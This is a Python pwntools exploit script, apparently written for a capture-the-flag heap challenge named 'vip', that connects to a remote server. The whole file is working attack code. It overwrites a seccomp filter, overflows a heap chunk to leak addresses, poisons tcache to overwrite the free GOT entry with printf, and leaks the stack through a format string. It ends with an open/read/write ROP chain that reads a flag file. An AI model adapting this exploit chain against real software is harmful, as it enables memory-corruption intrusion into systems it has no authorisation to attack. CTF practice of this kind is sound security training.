from pwn import *
#r=process('./vip',env = {"LD_PRELOAD":"./libc-2.27.so"})
r=remote('112.126.103.14',9999)
libc=ELF('./libc-2.27.so')
def add(idx):
    r.sendlineafter('choice:','1')
    r.sendlineafter('Index:',str(idx))

def free(idx):
    r.sendlineafter('choice:','3')
    r.sendlineafter('Index:',str(idx))

def show(idx):
    r.sendlineafter('choice:','2')
    r.sendlineafter('Index:',str(idx))

def edit(idx,size,content):
    r.sendlineafter('choice:','4')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    r.send(content)
def vip():
    r.sendlineafter(":","6")
    r.sendafter(':',flat('a'*0x20+p64(0x0000000000000020)+p64(0x0000010101000015)+p64(0x0005000000000006)+p64(0x7fff000000000006)))


elf=ELF('./vip')
vip()
add(0)
add(1)
add(2)
add(3)
add(4)
free(2)
free(1)
edit(0,0x70,'a'*(0x60-1)+'b')
show(0)
r.recvuntil('aaab')
heap=u64(r.recv(4).ljust(8,'\x00'))
if heap>0xa91b320:
    heap-=0xa000000

fake=heap-0xc0
print hex(heap)
edit(0,0x70,'%p%p%p%p%p%p'.ljust(0x50,'\x00')+p64(0)+p64(0x61)+p64(elf.got['free']))
add(1)
add(2)
free(4)
show(2)
r.recvuntil('\x20')
leak=u64(r.recv(6).ljust(8,'\x00'))
print hex(leak)
libcbase=leak-libc.symbols['free']
print hex(libcbase)
edit(2,0x8,p64(libcbase+libc.symbols['printf']))
free(0)
r.recvuntil('99990x')
stack=int(r.recv(12),16)
print hex(stack)
stack_fake=stack+0xe0-0xc1+0x8
edit(3,0x70,'flag'.ljust(0x50,'\x00')+p64(0)+p64(0x61)+p64(stack_fake))
flag_addr=heap+0x60
add(4)
add(5)#stack_fake

pop_rsi = 0x23e6a
pop_rdx = 0x1b96
pop_rax = 0x439c8
syscall = 0xd2975
xchg_ab = 0x9cdc0
#edit(5,0x80,p64(0x00000000004018fb)+p64(flag_addr)+p64(elf.plt['open'])+p64(0x401392))

payload = p64(0x4018fb)+p64(flag_addr)
payload += p64(libcbase+pop_rsi)+p64(0x0)
payload += p64(libcbase+pop_rax)+p64(0x2)
payload += p64(libcbase+syscall)
payload += p64(0x4018fb)+p64(3)
payload += p64(libcbase+pop_rsi)+p64(0x404100)
payload += p64(libcbase+pop_rdx)+p64(0x40)
payload += p64(libcbase+pop_rax)+p64(0)
payload += p64(libcbase+syscall)
payload += p64(0x4018fb)+p64(1)
payload += p64(libcbase+pop_rsi)+p64(0x404100)
payload += p64(libcbase+pop_rdx)+p64(0x40)
payload += p64(libcbase+pop_rax)+p64(1)
payload += p64(libcbase+syscall)

edit(5,0x100,payload)
#gdb.attach(r)
#pause()
r.interactive()